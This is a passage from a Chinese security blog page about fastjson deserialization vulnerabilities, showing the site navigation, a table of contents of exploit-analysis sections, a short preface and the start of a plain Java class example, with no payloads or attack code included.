<!doctype html><html lang=zh class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="happy hunting bugs"><meta name=author content=wh1t3p1g><link href=https://blog.0kami.cn/blog/2020/talk-about-fastjson-deserialization-20200413/ rel=canonical><link href=../rmi-registry-security-problem-20200206/ rel=prev><link href=../talk-about-xstream-deserialization-20200418/ rel=next><link rel=icon href=../../../assets/images/favicon.png><meta name=generator content="mkdocs-1.4.2, mkdocs-material-9.0.3"><title>浅谈fastjson反序列化漏洞 - wh1t3p1g's blog</title><link rel=stylesheet href=../../../assets/stylesheets/main.6b71719e.min.css><link rel=stylesheet href=../../../assets/stylesheets/palette.2505c338.min.css><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Noto+Sans+Hong+Kong:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback"><style>:root{--md-text-font:"Noto Sans Hong Kong";--md-code-font:"Roboto Mono"}</style><link rel=stylesheet href=../../../stylesheets/extra.css><script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script></head> <body dir=ltr data-md-color-scheme=default data-md-color-primary data-md-color-accent> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#0x00 class=md-skip> 跳转至 </a> </div> <div data-md-component=announce> </div> <header class=md-header data-md-component=header> <nav class="md-header__inner md-grid" aria-label=页眉> <a href=../../.. title="wh1t3p1g's blog" class="md-header__button md-logo" aria-label="wh1t3p1g's blog" data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg> </a> <label class="md-header__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg> </label> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> wh1t3p1g's blog </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> 浅谈fastjson反序列化漏洞 </span> </div> </div> </div> <label class="md-header__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=搜索 placeholder=搜索 autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query required> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg> </label> <nav class=md-search__options aria-label=查找> <button type=reset class="md-search__icon md-icon" title=清空当前内容 aria-label=清空当前内容 tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg> </button> </nav> </form> <div class=md-search__output> <div class=md-search__scrollwrap data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> 正在初始化搜索引擎 </div> <ol class=md-search-result__list></ol> </div> </div> </div> </div> </div> <div class=md-header__source> <a href=https://github.com/wh1t3p1g title=前往仓库 class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 480 512"><!-- Font Awesome Free 6.2.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1zM480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2zm-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3zm-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1z"/></svg> </div> <div class=md-source__repository> GitHub </div> </a> </div> </nav> </header> <div class=md-container data-md-component=container> <nav class=md-tabs aria-label=标签 data-md-component=tabs> <div class="md-tabs__inner md-grid"> <ul class=md-tabs__list> <li class=md-tabs__item> <a href=../../.. class=md-tabs__link> Home </a> </li> <li class=md-tabs__item> <a href=../../2023/introduce_of_tabby/ class="md-tabs__link md-tabs__link--active"> Blog </a> </li> <li class=md-tabs__item> <a href=../../../writeups/2020/xnuca-2020-easyjava/ class=md-tabs__link> Writeups </a> </li> <li class=md-tabs__item> <a href=../../../about/ class=md-tabs__link> About Me </a> </li> </ul> </div> </nav> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=sidebar data-md-type=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary md-nav--lifted" aria-label=导航栏 data-md-level=0> <label class=md-nav__title for=__drawer> <a href=../../.. title="wh1t3p1g's blog" class="md-nav__button md-logo" aria-label="wh1t3p1g's blog" data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg> </a> wh1t3p1g's blog </label> <div class=md-nav__source> <a href=https://github.com/wh1t3p1g title=前往仓库 class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 480 512"><!-- Font Awesome Free 6.2.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1zM480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2zm-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3zm-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1z"/></svg> </div> <div class=md-source__repository> GitHub </div> </a> </div> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../.. class=md-nav__link> Home </a> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle " data-md-toggle=__nav_2 type=checkbox id=__nav_2 checked> <label class=md-nav__link for=__nav_2 tabindex=0 aria-expanded=true> Blog <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Blog data-md-level=1> <label class=md-nav__title for=__nav_2> <span class="md-nav__icon md-icon"></span> Blog </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " data-md-toggle=__nav_2_1 type=checkbox id=__nav_2_1> <label class=md-nav__link for=__nav_2_1 tabindex=0 aria-expanded=false> 2023 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=2023 data-md-level=2> <label class=md-nav__title for=__nav_2_1> <span class="md-nav__icon md-icon"></span> 2023 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../2023/introduce_of_tabby/ class=md-nav__link> Introduce of tabby </a> </li> <li class=md-nav__item> <a href=../../2023/%E5%9F%BA%E4%BA%8E%E4%BB%A3%E7%A0%81%E5%B1%9E%E6%80%A7%E5%9B%BE%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AE%9E%E8%B7%B5/ class=md-nav__link> 基于代码属性图的自动化漏洞挖掘实践 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " data-md-toggle=__nav_2_2 type=checkbox id=__nav_2_2> <label class=md-nav__link for=__nav_2_2 tabindex=0 aria-expanded=false> 2021 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=2021 data-md-level=2> <label class=md-nav__title for=__nav_2_2> <span class="md-nav__icon md-icon"></span> 2021 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../2021/how_to_find_gadget_chains/ class=md-nav__link> 如何高效的挖掘Java反序列化利用链？ </a> </li> <li class=md-nav__item> <a href=../../2021/how_to_find_gadget_chains_2/ class=md-nav__link> 如何高效地捡漏反序列化利用链？ </a> </li> <li class=md-nav__item> <a href=../../2021/xstream_blacklist_bypass/ class=md-nav__link> XStream 1.4.15 Blacklist Bypass </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle " data-md-toggle=__nav_2_3 type=checkbox id=__nav_2_3 checked> <label class=md-nav__link for=__nav_2_3 tabindex=0 aria-expanded=true> 2020 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=2020 data-md-level=2> <label class=md-nav__title for=__nav_2_3> <span class="md-nav__icon md-icon"></span> 2020 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../java-jmx-rmi-20200310/ class=md-nav__link> 攻击Java JMX-RMI </a> </li> <li class=md-nav__item> <a href=../jndi-with-ldap-20200301/ class=md-nav__link> JNDI with LDAP </a> </li> <li class=md-nav__item> <a href=../jndi-with-rmi-20200209/ class=md-nav__link> JNDI with RMI </a> </li> <li class=md-nav__item> <a href=../rmi-registry-security-problem-20200206/ class=md-nav__link> 浅谈Java RMI Registry安全问题 </a> </li> <li class="md-nav__item md-nav__item--active"> <input class="md-nav__toggle md-toggle" data-md-toggle=toc type=checkbox id=__toc> <label class="md-nav__link md-nav__link--active" for=__toc> 浅谈fastjson反序列化漏洞 <span class="md-nav__icon md-icon"></span> </label> <a href=./ class="md-nav__link md-nav__link--active"> 浅谈fastjson反序列化漏洞 </a> <nav class="md-nav md-nav--secondary" aria-label=目录> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> 目录 </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#0x00 class=md-nav__link> 0x00 前言 </a> </li> <li class=md-nav__item> <a href=#0x01 class=md-nav__link> 0x01 基础知识 </a> <nav class=md-nav aria-label="0x01 基础知识"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#1-fastjson class=md-nav__link> (1). fastjson的基础使用 </a> </li> <li class=md-nav__item> <a href=#2fastjson class=md-nav__link> (2).fastjson的流程简介 </a> </li> <li class=md-nav__item> <a href=#3-fastjson-gettersetter class=md-nav__link> (3). fastjson 自动调用getter和setter </a> <nav class=md-nav aria-label="(3).  fastjson 自动调用getter和setter"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#1-parse-parseobject class=md-nav__link> 1. parse 和 parseObject的区别 </a> </li> <li class=md-nav__item> <a href=#2-parse class=md-nav__link> 2. parse自动调用函数的主要逻辑 </a> </li> <li class=md-nav__item> <a href=#3-parsegetters class=md-nav__link> 3. 突破parse不能调用所有getters的限制 </a> <nav class=md-nav aria-label="3. 突破parse不能调用所有getters的限制"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#tomcat-bcel-poc class=md-nav__link> 第一种：Tomcat BCEL POC思路 </a> </li> <li class=md-nav__item> <a href=#ref class=md-nav__link> 第二种：$ref点 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#4-private class=md-nav__link> (4). private属性 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#0x02-exp class=md-nav__link> 0x02 EXP分析 </a> <nav class=md-nav aria-label="0x02 EXP分析"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#1-templatesimpl class=md-nav__link> (1). templatesimpl </a> </li> <li class=md-nav__item> <a href=#2-jndi class=md-nav__link> (2). 基于JNDI的利用 </a> <nav class=md-nav aria-label="(2). 基于JNDI的利用"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#jdbcrowsetimpl class=md-nav__link> JdbcRowSetImpl </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#3-tomcat-dbcp-basicdatasource class=md-nav__link> (3). Tomcat dbcp BasicDataSource </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#0x03-fastjson class=md-nav__link> 0x03 Fastjson历史版本修复措施 </a> <nav class=md-nav aria-label="0x03 Fastjson历史版本修复措施"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#1-fastjson-1225 class=md-nav__link> (1). fastjson == 1.2.25 </a> <nav class=md-nav aria-label="(1). fastjson == 1.2.25"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#autotype class=md-nav__link> 开启AutoType的情况下绕过黑名单检测 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#2-fastjson-1242 class=md-nav__link> (2). fastjson == 1.2.42 </a> </li> <li class=md-nav__item> <a href=#3-fastjson-1243 class=md-nav__link> (3). fastjson == 1.2.43 </a> </li> <li class=md-nav__item> <a href=#4-fastjson-1248 class=md-nav__link> (4). fastjson == 1.2.48 </a> <nav class=md-nav aria-label="(4). fastjson == 1.2.48"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_1 class=md-nav__link> 修复前的版本 </a> </li> <li class=md-nav__item> <a href=#_2 class=md-nav__link> 修复后的版本 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#5 class=md-nav__link> (5). 后续版本 </a> </li> <li class=md-nav__item> <a href=#6 class=md-nav__link> (6). 后续版本觉得有意思的利用 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#0x04 class=md-nav__link> 0x04 总结 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../talk-about-xstream-deserialization-20200418/ class=md-nav__link> 回顾XStream反序列化漏洞 </a> </li> <li class=md-nav__item> <a href=../talk_about_struts2/ class=md-nav__link> struts2历史漏洞分析 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " data-md-toggle=__nav_2_4 type=checkbox id=__nav_2_4> <label class=md-nav__link for=__nav_2_4 tabindex=0 aria-expanded=false> 2019 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=2019 data-md-level=2> <label class=md-nav__title for=__nav_2_4> <span class="md-nav__icon md-icon"></span> 2019 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../2019/mycncart-v2-0-0-3-sqli-20190225/ class=md-nav__link> mycncart sqli </a> </li> <li class=md-nav__item> <a href=../../2019/study-java-deserialized-commonscollections3-1-20191024/ class=md-nav__link> Java反序列化利用链挖掘之CommonsCollections1 </a> </li> <li class=md-nav__item> <a href=../../2019/study-java-deserialized-commonscollections3-3-20191028/ class=md-nav__link> Java反序列化利用链挖掘之CommonsCollections3 </a> </li> <li class=md-nav__item> <a href=../../2019/study-java-deserialized-commonscollections3-others-20191031/ class=md-nav__link> Java反序列化利用链挖掘之CommonsCollections5,6,7,9,10 </a> </li> <li class=md-nav__item> <a href=../../2019/study-java-deserialized-commonscollections4-20191105/ class=md-nav__link> Java反序列化利用链挖掘之CommonsCollections2,4,8 </a> </li> <li class=md-nav__item> <a href=../../2019/study-java-deserialized-shiro-1-2-4-20191110/ class=md-nav__link> Java反序列化利用链挖掘之Shiro反序列化 </a> </li> <li class=md-nav__item> <a href=../../2019/temmoku-t1-15-sqli-20190221/ class=md-nav__link> temmoku home版 t1.15 前台sqli </a> </li> <li class=md-nav__item> <a href=../../2019/thinkphp-v5.x-App.php-rce/ class=md-nav__link> thinkphp v5.x App.php s参数RCE </a> </li> <li class=md-nav__item> <a href=../../2019/thinkphp_5.2.x_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/ class=md-nav__link> thinkphp v5.2.x 反序列化利用链挖掘 </a> </li> <li class=md-nav__item> <a href=../../2019/thinkphp_6.0.x_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/ class=md-nav__link> thinkphp v6.0.x 反序列化利用链挖掘 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " data-md-toggle=__nav_2_5 type=checkbox id=__nav_2_5> <label class=md-nav__link for=__nav_2_5 tabindex=0 aria-expanded=false> 2018 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=2018 data-md-level=2> <label class=md-nav__title for=__nav_2_5> <span class="md-nav__icon md-icon"></span> 2018 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../2018/MovieGuide2SQLi-20180203/ class=md-nav__link> MovieGuide v2.0 SQLi </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " data-md-toggle=__nav_2_6 type=checkbox id=__nav_2_6> <label class=md-nav__link for=__nav_2_6 tabindex=0 aria-expanded=false> 2017 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=2017 data-md-level=2> <label class=md-nav__title for=__nav_2_6> <span class="md-nav__icon md-icon"></span> 2017 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../2017/bluecms-v1-6-Sql-Injection/ class=md-nav__link> bluecms v1.6 Sql Injection 分析 </a> </li> <li class=md-nav__item> <a href=../../2017/old-DM-sql-injection/ class=md-nav__link> DM企业建站系统前台盲注 </a> </li> <li class=md-nav__item> <a href=../../2017/old-seacms-v6-5-getshell/ class=md-nav__link> seacms v6.5 前台getshell </a> </li> <li class=md-nav__item> <a href=../../2017/struts2-history-payload/ class=md-nav__link> Struts2命令执行各版本记录 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " data-md-toggle=__nav_2_7 type=checkbox id=__nav_2_7> <label class=md-nav__link for=__nav_2_7 tabindex=0 aria-expanded=false> 2016 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=2016 data-md-level=2> <label class=md-nav__title for=__nav_2_7> <span class="md-nav__icon md-icon"></span> 2016 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../2016/old-cve-2016-6663-mysql-exp/ class=md-nav__link> MYSQL提权分析 </a> </li> <li class=md-nav__item> <a href=../../2016/old-dirtycow-cve-2016-5195/ class=md-nav__link> CVE-2016-5195 Dirtycow </a> </li> <li class=md-nav__item> <a href=../../2016/old-wordpress-ssrf-4-4-2/ class=md-nav__link> wordpress SSRF <4.5 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " data-md-toggle=__nav_3 type=checkbox id=__nav_3> <label class=md-nav__link for=__nav_3 tabindex=0 aria-expanded=false> Writeups <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Writeups data-md-level=1> <label class=md-nav__title for=__nav_3> <span class="md-nav__icon md-icon"></span> Writeups </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " data-md-toggle=__nav_3_1 type=checkbox id=__nav_3_1> <label class=md-nav__link for=__nav_3_1 tabindex=0 aria-expanded=false> 2020 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=2020 data-md-level=2> <label class=md-nav__title for=__nav_3_1> <span class="md-nav__icon md-icon"></span> 2020 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../writeups/2020/xnuca-2020-easyjava/ class=md-nav__link> xnuca2020 easyjava设计思路 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " data-md-toggle=__nav_3_2 type=checkbox id=__nav_3_2> <label class=md-nav__link for=__nav_3_2 tabindex=0 aria-expanded=false> 2018 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=2018 data-md-level=2> <label class=md-nav__title for=__nav_3_2> <span class="md-nav__icon md-icon"></span> 2018 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../writeups/2018/ddctf-web-writeup-20180421/ class=md-nav__link> DDCTF 2018 web writeup </a> </li> <li class=md-nav__item> <a href=../../../writeups/2018/hitb-xctf-2018-portion-web-writeup-20180415/ class=md-nav__link> HITB-XCTF 2018 web writeup </a> </li> <li class=md-nav__item> <a href=../../../writeups/2018/old-python-sandbox-escape/ class=md-nav__link> python sandbox escape </a> </li> <li class=md-nav__item> <a href=../../../writeups/2018/suctf-part-web-writeup-20180528/ class=md-nav__link> SUCTF 2018 部分web writeup </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../about/ class=md-nav__link> About Me </a> </li> </ul> </nav> </div> </div> </div> <div class="md-sidebar md-sidebar--secondary" data-md-component=sidebar data-md-type=toc> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--secondary" aria-label=目录> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> 目录 </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#0x00 class=md-nav__link> 0x00 前言 </a> </li> <li class=md-nav__item> <a href=#0x01 class=md-nav__link> 0x01 基础知识 </a> <nav class=md-nav aria-label="0x01 基础知识"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#1-fastjson class=md-nav__link> (1). fastjson的基础使用 </a> </li> <li class=md-nav__item> <a href=#2fastjson class=md-nav__link> (2).fastjson的流程简介 </a> </li> <li class=md-nav__item> <a href=#3-fastjson-gettersetter class=md-nav__link> (3). fastjson 自动调用getter和setter </a> <nav class=md-nav aria-label="(3).  fastjson 自动调用getter和setter"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#1-parse-parseobject class=md-nav__link> 1. parse 和 parseObject的区别 </a> </li> <li class=md-nav__item> <a href=#2-parse class=md-nav__link> 2. parse自动调用函数的主要逻辑 </a> </li> <li class=md-nav__item> <a href=#3-parsegetters class=md-nav__link> 3. 突破parse不能调用所有getters的限制 </a> <nav class=md-nav aria-label="3. 突破parse不能调用所有getters的限制"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#tomcat-bcel-poc class=md-nav__link> 第一种：Tomcat BCEL POC思路 </a> </li> <li class=md-nav__item> <a href=#ref class=md-nav__link> 第二种：$ref点 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#4-private class=md-nav__link> (4). private属性 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#0x02-exp class=md-nav__link> 0x02 EXP分析 </a> <nav class=md-nav aria-label="0x02 EXP分析"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#1-templatesimpl class=md-nav__link> (1). templatesimpl </a> </li> <li class=md-nav__item> <a href=#2-jndi class=md-nav__link> (2). 基于JNDI的利用 </a> <nav class=md-nav aria-label="(2). 基于JNDI的利用"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#jdbcrowsetimpl class=md-nav__link> JdbcRowSetImpl </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#3-tomcat-dbcp-basicdatasource class=md-nav__link> (3). Tomcat dbcp BasicDataSource </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#0x03-fastjson class=md-nav__link> 0x03 Fastjson历史版本修复措施 </a> <nav class=md-nav aria-label="0x03 Fastjson历史版本修复措施"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#1-fastjson-1225 class=md-nav__link> (1). fastjson == 1.2.25 </a> <nav class=md-nav aria-label="(1). fastjson == 1.2.25"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#autotype class=md-nav__link> 开启AutoType的情况下绕过黑名单检测 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#2-fastjson-1242 class=md-nav__link> (2). fastjson == 1.2.42 </a> </li> <li class=md-nav__item> <a href=#3-fastjson-1243 class=md-nav__link> (3). fastjson == 1.2.43 </a> </li> <li class=md-nav__item> <a href=#4-fastjson-1248 class=md-nav__link> (4). fastjson == 1.2.48 </a> <nav class=md-nav aria-label="(4). fastjson == 1.2.48"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_1 class=md-nav__link> 修复前的版本 </a> </li> <li class=md-nav__item> <a href=#_2 class=md-nav__link> 修复后的版本 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#5 class=md-nav__link> (5). 后续版本 </a> </li> <li class=md-nav__item> <a href=#6 class=md-nav__link> (6). 后续版本觉得有意思的利用 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#0x04 class=md-nav__link> 0x04 总结 </a> </li> </ul> </nav> </div> </div> </div> <div class=md-content data-md-component=content> <article class="md-content__inner md-typeset"> <nav class=md-tags> <a href=../../../#java class=md-tag>java</a> </nav> <h1>浅谈fastjson反序列化漏洞</h1> <h2 id=0x00>0x00 前言</h2> <p>最近又碰上了fastjson的题目，想着是时候分析一波这个漏洞了，跟上师傅们的脚步。</p> <h2 id=0x01>0x01 基础知识</h2> <hr> <h3 id=1-fastjson>(1). fastjson的基础使用</h3> <blockquote> <p>fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。</p> </blockquote> <p>先来看一个简单的例子</p> <div class=highlight><pre><span></span><code><a id=__codelineno-0-1 name=__codelineno-0-1 href=#__codelineno-0-1></a><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>Phone</span><span class=w> </span><span class=p>{</span>
<a id=__codelineno-0-2 name=__codelineno-0-2 href=#__codelineno-0-2></a>
<a id=__codelineno-0-3 name=__codelineno-0-3 href=#__codelineno-0-3></a><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>phoneNumber</span><span class=p>;</span>
<a id=__codelineno-0-4 name=__codelineno-0-4 href=#__codelineno-0-4></a>
